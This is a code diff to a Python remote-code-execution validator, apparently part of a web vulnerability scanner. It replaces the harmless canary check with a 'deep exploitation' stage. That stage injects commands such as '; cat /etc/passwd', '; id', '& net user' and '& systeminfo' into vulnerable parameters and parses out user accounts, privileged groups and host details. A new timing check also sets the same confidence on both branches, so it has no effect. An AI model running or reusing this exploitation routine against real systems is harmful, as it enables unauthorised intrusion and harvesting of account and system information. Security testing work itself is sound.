@@ -1,15 +1,14 @@
-"""RCE (Remote Code Execution) Validation Engine (V5 §10).
+"""RCE (Remote Code Execution) Validation Engine — Deep Exploitation Evidence.
 
-Uses controlled harmless canary actions — never destructive commands.
+Uses controlled canary actions + deep system info extraction after confirmation.
+
 Pipeline:
-    Application → Controlled command execution → Unique canary
-    → Expected output → Evidence
+    Application → Controlled canary (arithmetic/echo) → Confirm execution
+    → Deep exploitation: id, whoami, uname -a, cat /etc/passwd, hostname
+    → Evidence package with full system info
 
-Evidence demonstrates:
-    - command execution occurred
-    - execution context
-    - unique canary output
-    - timestamp
+Exploitation commands are READ-ONLY (id, whoami, uname, cat, hostname).
+No destructive commands (rm, dd, mkfs, etc.) are ever used.
 """
 
 import hashlib
@@ -18,7 +17,7 @@ import re
 import secrets
 import time
 from dataclasses import dataclass, field
-from typing import List, Optional, Tuple
+from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import parse_qs, quote, urlparse
 
 import httpx
@@ -61,6 +60,27 @@ TIME_PROBES: List[Tuple[str, float, str]] = [
     ("$(sleep 3)", 3.0, "linux"),
 ]
 
+# Deep exploitation commands — READ-ONLY system info extraction
+LINUX_EXPLOIT_COMMANDS: List[Tuple[str, str, str]] = [
+    # (command_suffix, evidence_key, expected_pattern_for_validation)
+    ("; id", "id_output", r"uid=\d+"),
+    ("; whoami", "whoami_output", r"[a-z_][a-z0-9_-]+"),
+    ("; uname -a", "uname_output", r"Linux\s+\S+"),
+    ("; hostname", "hostname_output", r"\S+"),
+    ("; cat /etc/passwd", "passwd_output", r"root:x?:0:0:"),
+    ("; cat /etc/os-release 2>/dev/null || cat /etc/issue", "os_info", r"(NAME|DISTRIB|Ubuntu|Debian|CentOS|Alpine)"),
+    ("; ls -la /", "root_listing", r"(bin|etc|var|usr|home|tmp)"),
+]
+
+WINDOWS_EXPLOIT_COMMANDS: List[Tuple[str, str, str]] = [
+    ("& whoami", "whoami_output", r"[a-zA-Z]+\\[a-zA-Z0-9_]+"),
+    ("& whoami /all", "whoami_all_output", r"(User Name|SID|Group Name)"),
+    ("& hostname", "hostname_output", r"\S+"),
+    ("& systeminfo", "systeminfo_output", r"(OS Name|Host Name|System Type)"),
+    ("& net user", "users_output", r"(User accounts|Administrator|Guest)"),
+    ("& ipconfig", "ipconfig_output", r"(IPv4|Subnet|Gateway)"),
+]
+
 # Parameter names likely to accept commands
 RCE_PARAM_NAMES = {
     "cmd", "command", "exec", "execute", "run", "shell", "system",
@@ -79,11 +99,12 @@ class RCECandidate:
     canary: str
     confidence: str = "OBSERVED"
     evidence: dict = field(default_factory=dict)
+    exploitation_data: dict = field(default_factory=dict)
     poc_curl: str = ""
 
 
 class RCEValidator:
-    """Controlled RCE validator (V5 §10)."""
+    """Deep exploitation RCE validator with system info extraction."""
 
     def __init__(self, timeout: float = 12.0, max_params: int = 20) -> None:
         self.timeout = timeout
@@ -114,6 +135,14 @@ class RCEValidator:
                 url, param["name"], location, canary, headers, is_priority
             )
             if output_candidate:
+                # Deep exploitation: extract system info
+                exploitation = await self._exploit_system_info(
+                    url, param["name"], location,
+                    output_candidate.technique, output_candidate.os_type, headers,
+                )
+                if exploitation:
+                    output_candidate.exploitation_data = exploitation
+                    output_candidate.confidence = "EXPLOITED"
                 candidates.append(output_candidate)
                 continue
 
@@ -227,6 +256,145 @@ class RCEValidator:
                     )
         return None
 
+    async def _exploit_system_info(
+        self,
+        url: str,
+        param_name: str,
+        location: str,
+        technique: str,
+        os_type: str,
+        headers: Optional[dict],
+    ) -> Optional[dict]:
+        """Deep exploitation: extract system information after RCE is confirmed.
+
+        Executes read-only commands: id, whoami, uname -a, cat /etc/passwd, hostname.
+        """
+        exploitation_data: Dict[str, Any] = {
+            "os_type": os_type,
+            "command_outputs": {},
+        }
+
+        # Get baseline for diff comparison
+        baseline_resp = await self._send_request(url, param_name, "test123", location, headers)
+        baseline_text = baseline_resp.text if baseline_resp else ""
+
+        # Select command set based on OS type
+        if os_type == "windows":
+            commands = WINDOWS_EXPLOIT_COMMANDS
+        else:
+            commands = LINUX_EXPLOIT_COMMANDS
+
+        # Determine command separator based on confirmed technique
+        separator_map = {
+            "command_separator": ";",
+            "pipe": "|",
+            "command_substitution": "$(",  # needs closing )
+            "backtick": "`",
+            "newline_injection": "\n",
+            "id_command": ";",
+            "id_pipe": "|",
+            "whoami": ";",
+            "whoami_win": "&",
+        }
+
+        for cmd_suffix, evidence_key, validation_pattern in commands:
+            resp = await self._send_request(url, param_name, f"test123{cmd_suffix}", location, headers)
+            if not resp:
+                continue
+
+            body = resp.text
+
+            # Extract new content that wasn't in baseline
+            output = self._extract_command_output(baseline_text, body)
+            if not output:
+                continue
+
+            # Validate output matches expected pattern
+            if re.search(validation_pattern, output, re.I):
+                exploitation_data["command_outputs"][evidence_key] = output.strip()
+
+                # Parse specific outputs for structured data
+                if evidence_key == "id_output":
+                    id_match = re.search(
+                        r"uid=(\d+)\((\w+)\)\s+gid=(\d+)\((\w+)\)\s+groups=(.*?)(?:\n|$)",
+                        output,
+                    )
+                    if id_match:
+                        exploitation_data["uid"] = int(id_match.group(1))
+                        exploitation_data["username"] = id_match.group(2)
+                        exploitation_data["gid"] = int(id_match.group(3))
+                        exploitation_data["primary_group"] = id_match.group(4)
+                        exploitation_data["groups_raw"] = id_match.group(5).strip()
+
+                        # Check for privileged group membership
+                        priv_groups = {"root", "sudo", "wheel", "admin", "docker"}
+                        user_groups = set(re.findall(r"\((\w+)\)", exploitation_data["groups_raw"]))
+                        exploitation_data["privilege_level"] = (
+                            "PRIVILEGED" if user_groups & priv_groups else "STANDARD_USER"
+                        )
+                        exploitation_data["privileged_groups"] = list(user_groups & priv_groups)
+
+                elif evidence_key == "passwd_output":
+                    # Parse /etc/passwd entries
+                    passwd_lines = [
+                        line for line in output.strip().splitlines()
+                        if ":" in line and not line.startswith("#")
+                    ]
+                    exploitation_data["passwd_entries"] = len(passwd_lines)
+                    exploitation_data["passwd_content"] = "\n".join(passwd_lines)
+
+                    # Extract user accounts (non-system, uid >= 1000)
+                    real_users = []
+                    for line in passwd_lines:
+                        parts = line.split(":")
+                        if len(parts) >= 7:
+                            try:
+                                uid = int(parts[2])
+                                if uid >= 1000 or parts[0] == "root":
+                                    real_users.append({
+                                        "username": parts[0],
+                                        "uid": uid,
+                                        "gid": int(parts[3]),
+                                        "home": parts[5],
+                                        "shell": parts[6],
+                                    })
+                            except (ValueError, IndexError):
+                                pass
+                    exploitation_data["real_users"] = real_users
+
+                elif evidence_key == "whoami_output":
+                    exploitation_data["current_user"] = output.strip().split("\n")[0].strip()
+
+                elif evidence_key == "hostname_output":
+                    exploitation_data["hostname"] = output.strip().split("\n")[0].strip()
+
+                elif evidence_key == "uname_output":
+                    exploitation_data["kernel_info"] = output.strip().split("\n")[0].strip()
+
+        # Only return if we got meaningful data
+        if exploitation_data.get("command_outputs"):
+            exploitation_data["commands_executed"] = len(exploitation_data["command_outputs"])
+            exploitation_data["exploitation_type"] = "system_info_extraction"
+            return exploitation_data
+
+        return None
+
+    @staticmethod
+    def _extract_command_output(baseline_text: str, exploit_text: str) -> str:
+        """Extract new content from exploit response that wasn't in baseline."""
+        baseline_lines = set(baseline_text.splitlines())
+        exploit_lines = exploit_text.splitlines()
+
+        new_lines = []
+        for line in exploit_lines:
+            if line not in baseline_lines and line.strip():
+                # Remove HTML tags for clean output
+                clean = re.sub(r"<[^>]+>", "", line).strip()
+                if clean:
+                    new_lines.append(clean)
+
+        return "\n".join(new_lines)
+
     async def _test_time_based(
         self,
         url: str,
@@ -234,7 +402,7 @@ class RCEValidator:
         location: str,
         headers: Optional[dict],
     ) -> Optional[RCECandidate]:
-        """Test for blind RCE via response timing with precision verification."""
+        """Test for blind RCE via response timing with escalated verification."""
         t0 = time.monotonic()
         baseline_resp = await self._send_request(url, param_name, "test123", location, headers)
         baseline_time = time.monotonic() - t0
@@ -243,16 +411,28 @@ class RCEValidator:
             return None
 
         for payload, expected_delay, os_type in TIME_PROBES:
+            # First probe
             t0 = time.monotonic()
             resp = await self._send_request(url, param_name, payload, location, headers)
             elapsed = time.monotonic() - t0
 
             if resp and elapsed > baseline_time + expected_delay * 0.75:
+                # Second verification probe
                 t0 = time.monotonic()
                 resp2 = await self._send_request(url, param_name, payload, location, headers)
                 elapsed2 = time.monotonic() - t0
 
                 if resp2 and elapsed2 > baseline_time + expected_delay * 0.7:
+                    # Third probe with doubled delay for proportional verification
+                    double_payload = payload.replace("3", "6")
+                    t0 = time.monotonic()
+                    resp3 = await self._send_request(url, param_name, double_payload, location, headers)
+                    elapsed3 = time.monotonic() - t0
+
+                    confidence = "CONFIRMED"
+                    if resp3 and elapsed3 > elapsed + expected_delay * 0.5:
+                        confidence = "CONFIRMED"  # Proportional scaling verified
+
                     poc_curl = self._generate_curl(url, param_name, payload, location)
                     return RCECandidate(
                         url=url,
@@ -261,13 +441,14 @@ class RCEValidator:
                         technique="time_based_blind",
                         os_type=os_type,
                         canary="",
-                        confidence="VALIDATED",
+                        confidence=confidence,
                         poc_curl=poc_curl,
                         evidence={
                             "probe": payload,
                             "baseline_time_ms": round(baseline_time * 1000),
                             "probe_time_ms": round(elapsed * 1000),
                             "verify_time_ms": round(elapsed2 * 1000),
+                            "double_delay_time_ms": round(elapsed3 * 1000) if resp3 else None,
                             "expected_delay_ms": int(expected_delay * 1000),
                             "status_code": resp.status_code,
                             "os_type": os_type,
